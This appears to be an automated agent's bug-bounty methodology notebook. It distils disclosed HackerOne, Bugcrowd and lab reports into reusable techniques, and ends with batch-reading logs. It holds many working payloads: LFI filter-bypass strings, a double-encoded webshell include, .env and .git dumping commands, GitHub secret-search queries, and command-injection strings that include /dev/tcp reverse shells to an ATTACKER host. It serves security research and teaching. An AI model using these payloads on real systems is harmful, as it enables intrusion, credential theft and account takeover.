| 44217 | Generic — greedy regex filter bypass | Stored XSS | — |
| 534450 | Grammarly — noscript gap + cookie trust | Stored XSS → ATO | High 8.2 |
| 1028332 | HackerOne events — CNAME vendor inheritance | Stored → Reflected XSS | — |
| 3165242 | Lichess — `players` param, unauth | SSRF | Critical 9.8 |
| 2262382 | HackerOne — analytics error-message oracle | SSRF (full-read) | **$25,000**, Critical 10.0 |
| 2301565 | HackerOne — webhook "Test request" | SSRF | Medium 4.9 |
| 632101 | GitLab — redirect chain, `127.0.0.1` | SSRF bypass | High, CVE-2019-5464 |
| 878779 | GitLab/Grafana — redirect + URL-decode smuggle | SSRF (full-read) | Critical |
| 326040 | U.S. DoD — Jira OAuth `consumerUri` | SSRF + XSPA | Critical, CVE-2017-9506 |
| 781295 | h1-415 — headless Chrome CDP 9222 | SSRF / localhost probe | Critical |
| 1369312 | Concrete CMS — limited SSRF | SSRF | Low 3.5, CVE-2021-22969 |
| 3382343 | Nextcloud — OOO `userId` param | BOLA/IDOR | Medium 6.5 (Informative) |
| 3154983 | Mozilla FxA — session misbinding, delete account | IDOR | High |
| 2487889 | HackerOne — `/bugs.json` private reports | IDOR | Critical 9.3 |
| 2139190 | HackerOne — `LockReport` mutation | IDOR / access control | $2,500, Medium 6.1 |
| 2633771 | HackerOne — `AddTagToAssets` mutation | IDOR | Medium 5.3 |
| 2218334 | HackerOne — Copilot `DestroyLlmConversation` | IDOR (pre-release) | Medium 5.0 |
| 2528293 | GitLab — ML model registry | IDOR | $1,160, Medium 4.3 |
| 3085742 | Bykea — hardcoded zombie endpoint (APK) | IDOR | Medium 5.3 |
| 1733627 | TikTok Now Android — memory privacy setting | IDOR (write) | High |
| 404797 | Zomato — `photo_ids` delete | IDOR (write) | $600 |

---

*Append new entries in the same shape: source, core method as ordered bullets, detection signal, and
the transferable test. Keep the method separable from the target — the method is the asset.*

---
---

### [bugbountyhuntingskills.md] 8.1 Non-recursive filter removal — `....//`

**Source:** HTB Academy *File Inclusion* walkthrough (2026-02); same trick appears in the TryHackMe
*Include* box.

**Core method**
- The filter does `str_replace('../', '', $input)` **once**, not in a loop.
- Supply an overlap so the removal produces a fresh traversal:
  ```
  ....//....//....//....//etc/passwd
  ```
  `....//` → after one removal of `../` → `../`. Repeat per directory level.
- Confirm with the error text: PHP prints the exact path it tried
  (`include(dog../../../etc/passwd.php)`), which tells you both the prefix and the appended suffix.

**Lesson.** Every "sanitizer" that is a single `str_replace` is defeated by an overlapping token.
Enumerate: `....//`, `..././`, `..%2f`, `%2e%2e%2f`, `..%252f`, `..\/`, `..%c0%af` (overlong UTF-8),
and the mixed `..%5c..%5c` (Windows).

---

### [bugbountyhuntingskills.md] 8.2 Validate-then-decode ordering + hashed upload names

**Source:** HTB Academy *File Inclusion* lab (2026-02).

**Core method**
- `contact.php?region=` includes a local file and the code applies `urldecode()` **after** the
  security check. So the check sees `%2e%2e%2f`, the include sees `../`.
- Double-encode the whole traversal and the appended command separator:
  ```
  %252e%252e%252fuploads%252ffc023fcacb27a7ad72d605c4e300b389&cmd=ls%20/
  ```
- The upload endpoint stores files under an **MD5 of the filename**, discovered by reading
  `/api/application.php` through the same LFI. Compute the hash locally:
  ```bash
  echo -n 'shell.php' | md5sum
  ```
- Include the uploaded shell through the traversal → `cmd=` executes.

**Lesson.** The decode order is the bug, not the payload. Any pipeline of
`check → decode → use` is bypassable with one extra encoding layer. Read the source *through* the
LFI to learn the storage naming scheme before guessing paths.

**Transferable test.** Send the payload raw, single-encoded, and double-encoded in the same request
batch; only one will pass a broken pipeline. Then read the handler's source via the LFI itself.

---

### [bugbountyhuntingskills.md] 8.5 When the app appends an extension: null byte, truncation, wrappers

**Source:** Medium, *"Case: Path Truncation LFI"* (2024-08); Intigriti challenge #1025 (2025-10).

**Core method**
- Error text shows the app appends `.php`: `include(dog../../../etc/passwd.php)`.
- Options, in order of modernity:
  - **Null byte** (PHP < 5.3.4): `../../../../etc/passwd%00` → C string terminates at `%00`.
  - **Path truncation** (PHP < 5.3.0 / long paths): pad with `./` or `A` until the appended `.php`
    falls past the filesystem's 4096-byte limit.
  - **Wrapper trick**: `php://filter/convert.base64-encode/resource=index` to read source without
    executing it; `data://text/plain;base64,...` or `expect://` for execution when enabled.
  - **`/proc` self-inspection**: `/proc/self/environ`, `/proc/self/cmdline`, `/proc/self/fd/N`.
- Intigriti #1025 variant: a `stripos($url,'http')` check is satisfied while still reading local
  files by appending the required string as a **fragment**:
  ```
  ?url=file:///etc/hosts%23http
  ?url=file:///proc/self/cwd/?p=http
  ```
  `%23` = `#`; the filesystem/wrapper ignores it, `stripos` finds `http` after it.

**Lesson.** The fragment (`#`) and query (`?`) are free bytes to satisfy naive string checks. Same
trick defeated an extension whitelist in the Evernote SSRF (8.7).

---

## [bugbountyhuntingskills.md] 9. Source code, `.git`, `.env` and GitHub exposure

### [bugbountyhuntingskills.md] 9.1 Exposed `.git/` → full source → credentials → admin

**Source:** InfoSec Write-ups, *"Git Happens: When .git folders revealed the whole damn backend"*
(2025-07).

**Core method**
1. Content discovery finds `https://app.target.com/.git/config` → `200`.
2. Confirm with `/.git/HEAD` → `ref: refs/heads/main`.
3. Dump the repository:
   ```bash
   git-dumper https://app.target.com/.git/ /tmp/target-dump
   ```
4. Grep the dump for secrets and routes:
   ```bash
   grep -riE 'DB_PASS|JWT_SECRET|MAIL_PASS|AWS_' /tmp/target-dump
   ```
5. Reuse the leaked credentials against the app's own admin route (`/admin/login`), obtain a JWT,
   then call `/admin/users` with it.
- Recon stack that found it: `subfinder → httpx → gau/waybackurls → gf → dirsearch`, plus a custom
  Nuclei template for `/.git/config`.

**Lesson.** `.git/` is a *history* leak, not just a source leak: deleted secrets remain in
`git log -p`, and `git show <sha>:path` recovers files removed from HEAD. Always run
`git log --all --diff-filter=D` and `git grep` across all commits, not only the working tree.

**Transferable test.** `/.git/config`, `/.git/HEAD`, `/.svn/entries`, `/.hg/`, `/.DS_Store`,
`/backup.zip`, `/www.zip`. If 403 on the apex, retry on the origin hostname from the CNAME.

---

### [bugbountyhuntingskills.md] 9.2 `.env` reachable only through the origin/CNAME

**Source:** InfoSec Write-ups, *"Leaked Database and SMTP credentials through .env file"* (2023-09).

**Core method**
- `ffuf` finds `/.env` → but the browser shows **403** at the public hostname.
- `dig` the hostname → `CNAME exampleapp.azurewebsites.net`.
- The WAF/ACL is attached to the custom domain, not the platform origin. Requesting the origin
  hostname directly serves the same app **and** the `.env`:
  ```
  https://exampleapp.azurewebsites.net/.env
  ```
- Extract `DB_*`, `MAIL_*`, `APP_KEY`, `AWS_*`, then validate one credential read-only before
  reporting.

**Lesson.** A 403 is a statement about *one* hostname. Enumerate every name that resolves to the
same app: CNAME target, apex IP, IPv6, `*.herokuapp.com`, `*.s3.amazonaws.com`,
`*.blob.core.windows.net`, and the raw IP with `Host:`. This is the single highest-yield "blocked
but not blocked" pattern.

---

### [bugbountyhuntingskills.md] 9.4 Backup archives and `.bak` files

**Source:** InfoSec Write-ups, *"Bugged by Backup Files"* (2025-05); PortSwigger lab *Source code
disclosure via backup files*.

**Core method**
- Filter historical URLs by archive extension instead of by parameter:
  ```bash
  gau -subs target.com | grep -Ei '\.(zip|tar|tar\.gz|tgz|rar|7z|bak|old|save|swp)$'
  ```
- `wget` the hit, `unzip -l` first (list before extract), then `unzip`.
- Inside: `routes/`, `controllers/`, `config/`, `.env`, `deployment.sh` with SSH keys.
- `.bak` of a JS/HTML page often still contains an inline API key or a commented-out admin block:
  ```html
  <!-- backup-site.bak -->
  <script>var apiKey = "AIza..."; var bucket = "company-dev-bucket";</script>
  ```
- PortSwigger's lab variant: a `/backup` directory containing `ProductTemplate.java.bak` with a
  hard-coded DB password.

**Lesson.** Backup files are unauthenticated, unmonitored, and stale — they predate every security
fix. Check `file.bak`, `file~`, `file.old`, `file.save`, `file.swp`, `file.zip`, `file.tar.gz`,
`/.DS_Store`, and editor artifacts next to every discovered script.

---

### [bugbountyhuntingskills.md] 9.5 GitHub dorking with the API (not the web UI)

**Source:** InfoSec Write-ups, *"$1000-$10k worth Leaks via Github Secret Dorks"* (2025-02).

**Core method**
- Org footprint:
  ```bash
  gh api -X GET search/repositories -f q='org:"TargetCompany"'
  gh api -X GET search/commits    -f q='author-email:*@target.com'
  gh api -X GET search/users      -f q='in:email *@target.com'
  ```
- Code search, highest-signal patterns:
  ```bash
  gh api -X GET search/code -f q='org:Target filename:.env "API_KEY"'
  gh api -X GET search/code -f q='org:Target extension:json "aws_access_key_id"'
  gh api -X GET search/code -f q='extension:pem "BEGIN RSA PRIVATE KEY"'
  gh api -X GET search/code -f q='path:config password'
  gh api -X GET search/code -f q='path:.github/workflows/*.yml "aws-access-key-id"'
  gh api -X GET search/code -f q='language:yaml "type: service_account"'
  ```
- Local regex over a cloned org:
  ```bash
  grep -Ero 'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+' .
  ```
- **Deleted-secret recovery**: `git log -p --all -S 'AKIA'` and `git show <sha>:<path>` — secrets
  removed in a later commit are still in history.

**Lesson.** GitHub code search only indexes default branches and misses forks/gists/archived repos.
Cross-check with `git clone` + `trufflehog --only-verified`, and with `gist.github.com` search. A
secret is only reportable when you have proved it is **live** and **scoped** — one read-only call,
then stop.

---

### [bugbountyhuntingskills.md] 9.6 CI/CD as a credential store — anonymous Jenkins

**Source:** InfoSec Write-ups, *"Shodan't Have Shown That: exposed device → source code"* (2025-07).

**Core method**
- Shodan: `port:8080 title:Jenkins country:"IN"` → filter for anonymous-read instances.
- Build history → console output of `push-to-github`, `deploy-prod-api` → plaintext
  `GIT_USERNAME` / `GIT_PASSWORD`, registry creds, `AWS_*`.
- Clone with the leaked pair:
  ```bash
  git clone https://devopsadmin:p@ssw0rd1234@github.com/company/internal-api.git
  ```
- The repo contains `.env`, static admin tokens in tests, an undocumented `/admin/metrics`, and a
  `deployment.sh` with SSH keys.

**Lesson.** CI logs are the highest-density secret store in most orgs, and they are usually readable
by anyone who can read the job. Also check `/script`, `/manage`, `/asynchPeople/`,
`/view/all/builds`, and GitLab CI job traces, GitHub Actions logs, and Argo/Tekton dashboards.

---

### [bugbountyhuntingskills.md] 10.1 A framework upgrade changed serialization semantics — HackerOne `.json`

**Source:** HackerOne #3000510, **$25,000**, Critical; root-cause writeup by HackerOne engineering.

**Core method**
- The endpoint `/reports/:id.json` normally renders a sanitized `user` partial. With a reporter
  summary present, it also merged `summary.json_attributes`, which returns a Ruby hash keyed by the
  **symbol** `:user`.
- Rails 6.1 `to_json` kept the **last** duplicate key; Rails 7.1 `ActiveSupport::JSON.encode` keeps
  **both** a symbol key and a string key (JSON has no symbol type), producing a duplicate `"user"`
  key in the output.
- Result: the raw user object (email, unverified recovery phone, backup codes, `graphql_secret_token`)
  is serialized alongside the sanitized partial.
- The existing structural tests passed because the approvals gem re-parses the JSON, and Ruby's
  parser keeps only the **last** duplicate key — the assertion never saw the first one.

**Lesson.** Two reusable ideas. (1) Test every HTML route's `.json`/`.xml` sibling — they are built
from different templates with different redaction. (2) Duplicate JSON keys are a real disclosure
primitive: consumers that keep "last" hide the leak from tests while consumers that keep "first" (or
render raw) expose it. Grep responses for repeated keys.

**Transferable test.** For a sensitive object, request `/x`, `/x.json`, `/x.xml`, `/x?format=json`,
`/x?fields=all`, `/x?expand=user`, `/x?include=private`. Diff the key sets; look for keys the HTML
view does not render.

---

## [bugbountyhuntingskills.md] 11. Authentication and header-based bypass

### [bugbountyhuntingskills.md] 11.6 Miscellaneous bypass patterns worth a permanent slot

- **Parallel-request 403 bypass** — Facebook: sending multiple simultaneous requests to a
  permission-denied endpoint returned data on one of them (race in the authorization cache). Try
  `Turbo Intruder` with 20–50 concurrent identical requests before accepting a 403.
- **Path-based ACL bypass** — `/admin` → `/admin/`, `/admin/.`, `/admin%2f`, `/admin;.css`,
  `/./admin`, `//admin`, `/Admin`, `/admin%00`, `/admin?x=/public`.
- **JWT/`kid` + proxy combos** — see 11.1 and 11.2; the two compose.
- **Device-activation flows** (`/activate`) — IDOR/CSRF/clickjacking on the code-entry step →
  ATO (Bugcrowd tip #4).
- **Pre-hijacking** — register the victim's email via a classic form *before* they sign up with
  OAuth; when they later "link" the account, the attacker retains a recovery path. 35 of 75 tested
  services were vulnerable (pre-hijacking study, 2022).

---

### [bugbountyhuntingskills.md] 12.2 Cookie theft is not the impact — replaying it is

**Source:** Bugcrowd disclosure, Trello (Atlassian), DOM XSS → ATO.

**Core method**
- DOM XSS leaks `document.cookie` to the attacker's listener. The cookies lack `HttpOnly`.
- The stolen set includes a cookie named `token` — the **CSRF token**.
- Replay them against the API to prove account control:
  ```http
  GET /1/Members/me?tokens=all&sessions=all&credentials=all&logins=true&enterprises=true&enterprise_fields=prefs&token_plugins=true HTTP/1.1
  Cookie: <stolen>
  ```
- Response contains the victim's memberships, tokens, and enterprise prefs → admin of the workspace.

**Lesson.** The proof of impact is an authenticated API call with the stolen material, returning
data the attacker could not otherwise see. Include the request/response pair in the report.

---

### [bugbountyhuntingskills.md] 12.5 Zero-click variants (what "zero-click" actually means here)

- **TE.0 smuggling** (11.5) — no victim interaction beyond loading a page; the smuggled prefix
  captures the next request's cookies.
- **Cache deception** (8.8, 12.4) — victim loads one URL; the token is cached and collected later.
- **Host-header reset poisoning** (11.4) — victim clicks a legitimate-looking reset mail.
- **Pre-hijacking** (11.6) — no interaction at signup time; the trap is set before the account
  exists.
- True zero-click (no victim action at all) usually requires a server-side parser/deserialization
  bug, e.g. the SQLi→deserialization chain in 7.2 or a messaging gateway that processes attachments
  automatically.

---

### [bugbountyhuntingskills.md] 13.1 Template value → shell string (Airflow example DAGs)

**Source:** HackerOne #1492896 (CVE-2022-24288, **$1,200** + $300 project) and #1776476
(CVE-2022-40127, **$4,000** + $1,000).

**Core method**
- Source: `example_passing_params_via_test_command.py` builds a bash command from a Jinja template:
  ```python
  bash_command='echo "foo={{ params.foo }}"; echo "miff={{ params.miff }}"'
  ```
  The rendered value is interpolated **inside double quotes**, then handed to `BashOperator`.
- To break out, close the quote, run the command, reopen the quote so the rest parses:
  ```json
  {"foo": "\"; touch /tmp/pwned;\""}
  ```
- Reverse shell variant:
  ```json
  {"foo": "\"; bash -i >& /dev/tcp/ATTACKER/6666 0>&1;\""}
  ```
- Trigger via `POST /trigger?dag_id=example_passing_params_via_test_command` ("Trigger DAG w/
  config"), or set `run_id` where the template uses `{{ run_id }}`:
  ```
  run_id = `touch /tmp/success`
  ```
- Preconditions: example DAGs loaded (`[core] load_examples=True`), UI access, ability to trigger.

**Lesson.** Template engines are not shell escapers. Find every `BashOperator`/`subprocess`/
`os.system` whose command string contains `{{ ... }}` or an f-string, then determine the quoting
context. The payload differs for unquoted (`; id`), single-quoted (`'; id; '`), and double-quoted
(`"; id; "`) contexts.

---

### [bugbountyhuntingskills.md] 13.2 Chat-command arguments → `$()` substitution

**Source:** HackerOne #851807 — Nextcloud Talk, Critical.

**Core method**
- Admins register chat commands executed through `@exec`; user-supplied arguments are appended to
  the command line.
- If arguments are accepted, bash command substitution executes inside them:
  ```
  /wiki test $(mycommand)
  /calc 1+1 `id`
  ```
- Reverse shell: `/wiki test $(bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1')`.
- Fix in this case quote-wrapped `{ARGUMENTS}` and blocked the escaped parameters inside `'`, `"`,
  and backticks — i.e. the original fix was incomplete until all three quoting contexts were
  handled.

**Lesson.** `escapeshellarg()` alone is not enough if the argument is later re-parsed by a shell or
by a second interpreter. Test `$()`, backticks, `${IFS}`, newline, and `;` separately; each maps to a
different quoting layer.

---

### [bugbountyhuntingskills.md] 13.4 Import pipeline: branch name → command execution (GitHub)

**Source:** GitHub Security Bug Bounty, by @ajxchapman (Mercurial import), summarized in GitHub's
6-year retrospective.

**Core method**
- The Mercurial import logic did not sanitize branch names; a crafted branch name was interpolated
  into a shell command during import.
- The import ran in a sandbox on dedicated servers, which capped impact — but the bug was still RCE
  in the import worker.
- Root cause was an **outdated dependency** where the fix already existed upstream.

**Lesson.** VCS import/migration features execute repository-controlled metadata (branch names,
tags, submodule URLs, `.gitmodules`, hooks). Test every import path with a repository you control
containing hostile ref names, and check whether the worker is sandboxed before claiming full
compromise.

---

### [bugbountyhuntingskills.md] 13.8 Command-injection detection ladder

1. **Reflection test** — `; echo $((7*7))`, `| id`, `$(id)`, `` `id` ``, `%0aid`, and a newline
   variant. Compare output, not status.
2. **Blind/time** — `; sleep 5`, `| ping -c 1 COLLAB`, `$(curl COLLAB)`.
3. **Quoting context** — try the payload wrapped in `'`, `"`, and backticks; only one will parse.
4. **Filter bypass** — `${IFS}` for spaces, `$@`, `%09`, base64 (`echo BASE64|base64 -d|sh`),
   wildcard globbing (`/bin/c?t /etc/passwd`), and `\` line continuation.
5. **Argument injection** — when no shell is involved, inject CLI flags instead
   (`--output=/var/www/x.php`, `-oProxyCommand=...`).
6. **Escalation** — reverse shell, then read cloud metadata/instance role (see 8.3, 8.7) before
   claiming impact.

---

## [bugbountyhuntingskills.md] 14. Dorking tradecraft (how to actually run the templates)

The seven templates in the brief are correct in intent but brittle in practice. Refinements:

**Syntax that silently breaks a query**
- `site::example.com` (double colon) is not an operator — Google ignores it and returns the whole
  web. The working form is `site:example.com`.
- Long `OR`-chained `site:` lists get truncated; Google effectively caps queries near 32 tokens.
  Run **one domain per query** and merge results yourself.
- `filetype:` and `ext:` are near-synonyms; `ext:` is more reliable for source files.
- Parenthesised `OR` must be uppercase; quoted phrases must be exact; `-term` excludes.
- `AROUND(3)`, `before:2024-01-01`, `after:2023-01-01` still work and are underused.

**Per-class query shapes that survive**

```

## [bugbountyhuntingskills.md] Source / git / env

site:infosecwriteups.com (".git" OR ".env" OR "backup file") ("source code" OR "disclosure")
github.com "BEGIN RSA PRIVATE KEY" -in:file   # use GitHub code search instead of Google

## [bugbountyhuntingskills.md] Auth / header

site:hackerone.com ("authentication bypass" OR "header injection") ("host header" OR "jwt")
site:intigriti.com "authentication bypass" ("chain" OR "ato")

## [bugbountyhuntingskills.md] 15. Master checklist (Part II)

**Injection**
- [ ] Array-shaped parameters (`foo[]`) into `implode`/`IN (...)`.
- [ ] Every login/registration/reset form for SQLi and NoSQLi (`{"$ne":null}`, `{"$gt":""}`).
- [ ] Second-order: store payload in profile, trigger admin/report/export view.
- [ ] Template fields (`{{ }}`, `${ }`, `#{ }`) reaching a shell or a second interpreter.
- [ ] `child_process`/`Runtime.exec`/`os.system`/`shell=True` with string concatenation.

**File handling**
- [ ] Traversal in path, filename, multipart `filename*`, and JSON `name`.
- [ ] Non-recursive filters → `....//`; decode-after-validate → double encoding.
- [ ] Appended extension → `%00`, truncation, `php://filter`, `#`/`?` fragment trick.
- [ ] `readfile`/`file_get_contents`/`include` accepting URLs → SSRF + LFI in one parameter.
- [ ] Upload dir executable? `.htaccess`/`web.config` writable? MIME sniffing on the CDN origin?

**Secrets and source**
- [ ] `/.git/`, `/.svn/`, `/.hg/`, `.DS_Store`, `*.bak`, `*.zip`, `*.old`, `*.swp`.
- [ ] `.env` on the apex **and** on the CNAME/origin host.
- [ ] Client bundles: `app.asar`, APK, IPA, source maps — grep for `ghp_`, `AKIA`, `AIza`, `sk_live_`.
- [ ] GitHub org, forks, gists, commit history (`git log -S`), Actions logs.
- [ ] CI dashboards, build logs, artifact stores.

**Disclosure**
- [ ] `.json`/`.xml`/`?format=` siblings; `fields`/`expand`/`include` over-request.
- [ ] GraphQL: introspection, field-level authz, object-level authz, persisted queries.
- [ ] Error pages, stack traces, Actuator, Swagger, source maps.
- [ ] Enumeration endpoints (users, orgs, invites) and their chaining value.
- [ ] Duplicate keys / uninitialized memory / cached private responses.

**Auth**
- [ ] Header separator smuggling (`_` vs `-`), duplicate headers, trailing whitespace.
- [ ] Path differentials: `;`, `%3b`, `..;/`, `%2f`, `//`, trailing dot.
- [ ] JWT: `alg:none` (and `nonE`), no signature, `jwk`, `kid` traversal/SQLi, RS→HS confusion.
- [ ] Host-header poisoning on every email-generating feature.
- [ ] Reset/invite flows: token predictability, expiry, UUID linking, unaccepted invites.
- [ ] 403 bypass by concurrency; IP allowlist via `X-Forwarded-For`.
- [ ] OAuth: `redirect_uri` path/parameter tricks, missing `state`, implicit-flow token in fragment.

**Chains**
- [ ] XSS + no-password email change → ATO.
- [ ] Cache deception + CSPT/open redirect → token theft.
- [ ] SSRF + localhost management plane → RCE.
- [ ] File write + `authorized_keys`/cron/`.pth` → RCE.
- [ ] SQLi + `unserialize` → RCE.
- [ ] Smuggling → next-user request capture → ATO.

---

## [bugbountyhuntingskills.md] 16. Source index — Part II

| Report / source | Class | Reward / severity |
|---|---|---|
| H1 #1081145 — ImpressCMS `findusers.php` | SQLi (array param) | Critical chain |
| H1 #1842674 — Krisp / tenweb-speed-optimizer | SQLi → deserialization → RCE | Critical |
| Intigriti — Broken Authentication guide | Auth bypass, reset, remember-me | — |
| HTB Academy — File Inclusion | LFI filter bypass, decode order | — |
| Medium — `readfile()` LFI+SSRF (2025-06) | LFI / SSRF | — |
| Medium — upload filename traversal (2025-06) | Path traversal | Critical |
| Medium — path truncation LFI (2024-08) | LFI → RCE | — |
| Intigriti challenge #1025 | `file://` + fragment bypass | — |
| Neolex — Evernote SSRF | SSRF/LFI via base64 + `#.js` | **$5,000** |
| Harel — ChatGPT wildcard cache deception | Path traversal + cache → ATO | **$6,500** |
| InfoSec — `.git` dump | Source disclosure → ATO | — |
| InfoSec — `.env` via Azure CNAME | Secret exposure | — |
| H1 #1087489 — Shopify Electron `.env` | Secret exposure (GH PAT) | **$50,000** |
| InfoSec — backup files | Source disclosure | — |
| InfoSec — GitHub secret dorks | Secret hunting | — |
| InfoSec — Jenkins build logs | CI secret exposure | — |
| H1 #3000510 — HackerOne `.json` | Info disclosure (Rails dup key) | **$25,000**, Critical |
| H1 #489146 — HackerOne GraphQL | Info disclosure / authz | **$20,000**, Critical |
| H1 #1735586 — MTN WP REST users | User enumeration | Low/Medium |
| H1 #1256371 — swag link PII | PII disclosure | Low |
| Basecamp / librsvg (via H1 blog) | Memory disclosure | **$8,868** |
| Telekom — header smuggling (Verton) | Auth bypass | Critical |
| Intigriti — JWT guide | Auth bypass | — |
| Bugcrowd — OAuth + forgot password | ATO chain | — |
| Bugcrowd/NASA — Host header ATO | ATO | P2 |
| Bugcrowd — TE.0 smuggling | Request smuggling → 0-click ATO | **$8,500** |
| Bugcrowd — Trello DOM XSS | XSS → ATO | — |
| H1 #783877 — Slack desktop | HTMLi → Electron RCE | Critical 9–10 |
| zere.es — cache deception + CSPT | ATO chain | — |
| H1 #1492896 — Airflow CVE-2022-24288 | Command injection | **$1,200** + $300 |
| H1 #1776476 — Airflow CVE-2022-40127 | Command injection | **$4,000** + $1,000 |
| H1 #851807 — Nextcloud Talk | Command injection | Critical |
| H1 #685447 — gitlabhook | Command injection | Critical 10.0 |
| GitHub — Mercurial import | Command injection | — |
| H1 #298873 — GitLab import | File write → RCE | **$2,000** |
| H1 #1547877 — Aiven Kafka Connect | SSRF + JNDI/JVMTI → RCE | **$5,000** |
| H1 #2293731 — libssh CVE-2023-6004 | Argument injection | **$540** |
| H1 #3292573 — Django FilteredRelation alias | SQLi (ORM annotation alias) → RCE | CVE-2025-57833, Critical 10.0 |
| CVE-2026-9082 — Drupal PostgreSQL EntityQuery | SQLi (array-key IN-list) → RCE | CVSS 9.8, CISA KEV |
| Bugcrowd/NASA — Space Place API | SQLi (POST parameter name) | P1 |
| Bugcrowd/NASA — JPL Photojournal sort | SQLi (time-based blind) | P1 |
| Bugcrowd/NASA — REST API label param | SQLi (boolean-blind, Oracle) | P1 |
| ozgur_bbh/anilyukk — BigQuery (Synack) | BigQuery SQLi dialect exploitation | **$50,000+** |
| stypr — mysqljs/mysql escape bypass | SQLi (object type coercion, auth bypass) | — |
| ExpressionEngine Structure plugin | SQLi (`channel_ids`, admin req'd) | — |
| Automattic #1046084 | SQLi (Union based) | — |

---

*Append new entries in the same shape: source, core method as ordered bullets, detection signal, and
the transferable test. Keep the method separable from the target — the method is the asset. Where a
technique is only exploitable in a chain, record every link, not just the first one.*

---

## [bugbountyhuntingskills.md] VALID BUT NOT APPENDED (nothing new, nothing invented)

- HackerOne #1132803 (On, "Graphql introspection is enabled and leaks details about the schema", reporter `sahil__soni`, submitted 2021-03-23, disclosed 2021-05-09, Low, weakness Misconfiguration; full body read via the live `.json` route, `visibility: full`, 3,038 B). The introspection query on `https://www.on-running.com/en-in/graphql` dumps the schema and reveals a `userExists(email:"...")` query that returns a boolean — an unauthenticated email-enumeration oracle. The introspection method is already recorded (Bugbountyskills.md §5 V-07, harvest ledger §17.276) and user enumeration is a recorded primitive (V-04); the report demonstrates NO chain beyond the enumeration boolean (it claims "an attacker will be able to modify and list the data" but shows no mutation call and no data), so per doctrine §5/§8 it is a primitive, not an entry.
- HackerOne #381553 (Imgur, "HTML Injection with XSS possible", disclosed 2021-04-29, Medium; INVALID). Route: `web_extract` -> HTTP 403; `r.jina.ai` -> HTTP 401/CAPTCHA; the browser tool -> Cloudflare "Just a moment"; the live `.json` route -> HTTP 404; the Wayback captures (`20210429214543`, `20221004160726`, `20230204100931`) are all the "JavaScript is disabled" SPA shell, but the `og:description` meta carries the reporter's own summary, verbatim: "Hi, I found HTML Injection on imgur.com / Description: I couldn't get xss but i was able to include videos on my profile and also i was able to redirect users to malicious websites / POC (HTML injection): go to https://12test.imgur.com (you don't need to login) and you will see external videos and you will see image click on it and you will redirect to http://evil.com, note that this test page...". The reporter explicitly states "I couldn't get xss"; the "PoC" is an HTML injection on a test subdomain that redirects a click to `evil.com`. No XSS payload, no bypass, no account impact, no chain — INVALID, nothing extracted.
- HackerOne #949382 (Automattic, "DOM-Based XSS in tumblr.com", reporter `keer0k`, submitted 2020-08-01, disclosed 2021-02-02, Medium, weakness Cross-site Scripting (XSS) - DOM; full body + comments read via the live page). The payload is `javascript://tumblr.com%0aalert(document.domain);` in a link field on `/reblog/ID/OTHER_ID`, which "doesn't have a correct CSP rule"; a stored variant uses the same payload in a submitted post that executes when the victim opens it in the inbox editor. The `javascript://%0a<PROOF>()` comment-trick payload is already recorded (Bugbountyskills.md payload list, "comment-trick for some filters"), and the DOM-XSS class is extensively recorded; the only delta is the detection signal that CSP is PER-ROUTE (a sibling route may lack it), which is a signal, not a new technique. No new entry.
- HackerOne #947728 (Shopify, "staff can able to extend shopify trial period without admin permission", reporter `risinghunter`, submitted 2020-07-30, disclosed 2020-09-15, Low, weakness Improper Access Control - Generic; full body read via the live page + `.json`). A staff account with only the "report" permission replays `POST /admin/internal/web/graphql/core` with `X-Shopify-Web-Force-Proxy: 1` and body `{"operationName":"TrialSelfExtend","variables":{},"query":"mutation TrialSelfExtend { trialSelfExtend { message userErrors { field message __typename } __typename } }"}` -> "14 days extension added to your trial period". This is EXACTLY the recorded Shopify internal-admin-GraphQL class (§17.198 `fileCopy`, the `billingChargesExport` / `emailSenderConfigurationUpdate` / `shopOwnedAppCreate` entries — a low-priv staff session replaying an undocumented internal mutation whose resolver never consults the role). DUPLICATE, nothing appended. (Team rated it Low and paid $500 under "Circumvention of user permission model".)

NOTE — reader pass 2026-11-11 batch 144 (6 assigned sources read ONE BY ONE in the given order; 2 entries appended to the harvest ledger `/root/bugbountyhuntingskills.md` and the dated knowledge file `/root/hackbot-architecture/knowledge/methodologies-2026-11-11.md`; 2 new §17 slots). NEW: (1) HackerOne #876708 (U.S. Dept Of Defense, "Remote Code Execution through DNN Cookie Deserialization", reporter cristiancornea, submitted 2020-05-17, disclosed 2020-05-27, High, weakness OS Command Injection; `visibility: full`, body read in full via the live `.json` route) — the `DNNPersonalization` cookie is deserialized with .NET BinaryFormatter; a ysoserial.net `ExpandedWrapper<FileSystemUtils, ObjectDataProvider>` payload with `MethodName = WriteFile` writes an arbitrary file -> RCE. The gadget uses the product's OWN class, so no third-party dependency is needed; NEW general method -> §17.438. (2) HackerOne #380354 (Roblox, "Reflected XSS through multiple inputs in the issue collector on Jira", reporter jackb898, submitted 2018-07-11, disclosed 2020-03-24, Medium, CVE-2018-5230; full body read via `web_extract`) — the Jira issue collector's "Updated Date" filter inputs reflect the payload; the sanitizer appends backslashes to double-quoted attributes but leaves single-quoted attributes intact, so `<iframe src='//attacker'>` bypasses it; the chain reaches the core Roblox session cookie (shared onto `jira.roblox.com`) -> account takeover; NEW general method -> §17.439. VALID BUT NOT APPENDED: #1132803 (On — GraphQL introspection + `userExists(email:)` boolean enumeration oracle; introspection and user enumeration already recorded, no chain), #949382 (Tumblr — `javascript://%0a` payload already recorded; only delta is per-route CSP, a detection signal), #947728 (Shopify `TrialSelfExtend` — duplicate of the recorded internal-admin-GraphQL low-priv-staff class). INVALID: #381553 (Imgur — reporter states "I couldn't get xss"; the "PoC" is an HTML injection/redirect on a test subdomain with no payload, bypass or chain; live page 403, `.json` 404, browser Cloudflare, r.jina CAPTCHA, Wayback = JS-disabled shell). 6 sources read, 0 fabricated.

---

## [bugbountyhuntingskills.md] Batch 145 — 6 sources, read ONE BY ONE in the assigned order (2026-11-11)

Knowledge intake only. No target was touched; the only network traffic was `web_extract` / `curl` against `hackerone.com` and `cure53.de`.

### [bugbountyhuntingskills.md] RESULT: 2 entries appended (2 new §17 slots); 6 sources read, 0 fabricated

READ ONE BY ONE in the assigned order. 3 VALID sources read; 2 appended; 1 valid-but-nothing-new (already-recorded debug-page class, no chain) recorded honestly below and in the harvest ledger; 3 INVALID (redacted URL / redacted endpoint / no attacker-reachable sink).

---

SOURCE: https://hackerone.com/reports/2623715  2026-11-11
